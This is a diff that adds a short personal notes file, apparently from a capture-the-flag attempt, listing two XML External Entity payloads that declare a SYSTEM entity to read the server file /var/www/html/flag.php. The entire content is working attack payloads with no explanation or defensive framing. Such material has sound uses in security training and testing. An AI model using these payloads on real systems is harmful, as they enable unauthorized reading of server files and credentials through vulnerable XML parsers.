@@ -1,0 +1,19 @@
+
+Payload I try
+
+  Payload 3:
+
+    <?xml version="1.0" ?>
+    <!DOCTYPE r [
+    <!ELEMENT r ANY >
+    <!ENTITY sp SYSTEM "file:///var/www/html/flag.php">
+    ]>
+    <r>&sp;</r>
+
+  Payload 4:
+
+    <?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE data [
+    <!ENTITY file SYSTEM "file:///var/www/html/flag.php">
+    ]>
+    <data>&file;</data>
